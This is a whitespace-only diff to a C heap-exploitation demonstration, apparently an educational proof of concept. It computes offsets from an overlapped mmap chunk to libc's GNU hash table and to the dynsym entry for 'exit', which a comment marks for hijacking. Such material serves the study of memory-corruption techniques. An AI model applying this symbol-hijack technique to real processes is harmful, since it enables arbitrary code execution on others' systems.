@@ -207,7 +207,7 @@ int main() {
     printf("            So we will calculate the offsets of the targets to the overlapped chunk\n");
     printf("            Start writing from the entry at: %p\n", overlap_ptr);
 
-    // uint64_t write_to_libc_offset	= (uint64_t)libc_base - (uint64_t)overlap_ptr;
+    // uint64_t write_to_libc_offset = (uint64_t)libc_base - (uint64_t)overlap_ptr;
     ptrdiff_t write_to_libc_offset  = DISTANCE(libc_base, overlap_ptr);
     ptrdiff_t bitmask_word_offset   = BITMASK_OFFSET + ((NEW_HASH / 0x40) & 0xff) * 8;	// bitmask_word for "exit"
     uint32_t bucket_index           = NEW_HASH % NBUCKETS;	// bucket index for "exit" (0xc4)
@@ -215,9 +215,9 @@ int main() {
     ptrdiff_t hasharr_offset        = CHAIN_ZERO_OFFSET + BUCKET * 4;	// hasharr[i] for "exit"
         
     size_t bitmask_word_addr    = (size_t)overlap_ptr + write_to_libc_offset + bitmask_word_offset;
-    size_t bucket_addr		    = (size_t)overlap_ptr + write_to_libc_offset + bucket_offset;
-    size_t hasharr_addr		    = (size_t)overlap_ptr + write_to_libc_offset + hasharr_offset;
-    size_t exit_symtab_addr	    = (size_t)overlap_ptr + write_to_libc_offset + DYNSYM_OFFSET + EXIT_SYM_INDEX * ST_SIZE;	// [!] Hijack 
+    size_t bucket_addr          = (size_t)overlap_ptr + write_to_libc_offset + bucket_offset;
+    size_t hasharr_addr         = (size_t)overlap_ptr + write_to_libc_offset + hasharr_offset;
+    size_t exit_symtab_addr     = (size_t)overlap_ptr + write_to_libc_offset + DYNSYM_OFFSET + EXIT_SYM_INDEX * ST_SIZE;	// [!] Hijack 
 
     printf("[+] bitmask_word addr: %p, offset to mmap chunk pt: 0x%tx\n", (void *)bitmask_word_addr, DISTANCE(bitmask_word_addr, overlap_ptr));
     printf("[+] bucket addr      : %p, offset to mmap chunk pt: 0x%tx\n", (void *)bucket_addr, DISTANCE(bucket_addr, overlap_ptr));
